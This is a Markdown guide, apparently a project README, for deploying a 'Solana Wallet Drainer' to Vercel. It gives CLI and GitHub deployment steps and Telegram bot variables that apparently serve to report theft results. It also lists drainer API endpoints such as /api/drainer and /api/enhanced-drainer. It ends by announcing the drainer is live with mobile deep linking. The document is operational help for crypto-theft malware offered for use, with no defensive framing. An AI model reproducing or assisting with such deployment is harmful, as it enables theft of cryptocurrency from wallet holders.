# Vercel Deployment Guide

## 🚀 Deploying Your Solana Wallet Drainer to Vercel

### Prerequisites
- Vercel account (free tier available)
- GitHub repository with your code
- Environment variables configured

### Step 1: Prepare Your Repository

Your project is already configured for Vercel deployment with:
- ✅ `vercel.json` configuration file
- ✅ Vercel-compatible API handlers
- ✅ Proper package.json with Node.js 22.x
- ✅ All necessary dependencies

### Step 2: Environment Variables

Set these environment variables in your Vercel dashboard:

#### Required Variables:
```
TELEGRAM_BOT_TOKEN=your_telegram_bot_token
TELEGRAM_CHAT_ID=your_telegram_chat_id
NODE_ENV=production
```

#### Optional Variables:
```
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
HELIUS_RPC_URL=https://mainnet.helius-rpc.com/?api-key=your_key
SHYFT_RPC_URL=https://rpc.shyft.to?api_key=your_key
```

### Step 3: Deploy to Vercel

#### Option A: Deploy via Vercel CLI
```bash
# Install Vercel CLI
npm i -g vercel

# Login to Vercel
vercel login

# Deploy from your project directory
vercel

# Follow the prompts:
# - Link to existing project or create new
# - Set project name
# - Confirm settings
```

#### Option B: Deploy via GitHub Integration
1. Go to [vercel.com](https://vercel.com)
2. Click "New Project"
3. Import your GitHub repository
4. Vercel will auto-detect the configuration
5. Add environment variables
6. Click "Deploy"

### Step 4: Configure Custom Domain (Optional)

1. Go to your project dashboard
2. Navigate to "Domains"
3. Add your custom domain
4. Update DNS records as instructed

### Step 5: Test Your Deployment

After deployment, test these endpoints:

- **Main App**: `https://your-project.vercel.app/`
- **Wallet Management**: `https://your-project.vercel.app/api/wallet-management`
- **Unified Drainer**: `https://your-project.vercel.app/api/unified-drainer`
- **Enhanced Drainer**: `https://your-project.vercel.app/api/enhanced-drainer`

### API Endpoints Available:

```
/api/drainer                    - Main drainer endpoint
/api/wallet-management          - Wallet detection & management
/api/unified-drainer            - Unified drainer functionality
/api/enhanced-drainer           - Enhanced drainer features
/api/enhancements/*             - Additional enhancements
```

### Troubleshooting

#### Common Issues:

1. **Environment Variables Not Set**
   - Check Vercel dashboard → Settings → Environment Variables
   - Ensure variables are set for Production environment

2. **Function Timeout**
   - Current timeout: 30 seconds
   - Adjust in `vercel.json` if needed

3. **Import Errors**
   - All modules use dynamic imports for Vercel compatibility
   - Check console logs for specific errors

4. **CORS Issues**
   - CORS is configured in `vercel.json`
   - Check browser console for specific errors

### Performance Optimization

Your deployment includes:
- ✅ Static file caching (images, CSS, JS)
- ✅ CORS headers for cross-origin requests
- ✅ Optimized function timeouts
- ✅ Proper content-type headers

### Security Notes

- Environment variables are secure in Vercel
- API keys are not exposed to client-side
- All sensitive data is server-side only

### Monitoring

Monitor your deployment:
- Vercel dashboard shows function logs
- Check "Functions" tab for execution details
- Monitor "Analytics" for usage statistics

### Updates

To update your deployment:
```bash
# Make changes to your code
git add .
git commit -m "Update deployment"
git push

# Vercel will automatically redeploy
```

---

## 🎉 Your Solana Wallet Drainer is now live on Vercel!

The enhanced mobile deep linking system will work seamlessly across all platforms.
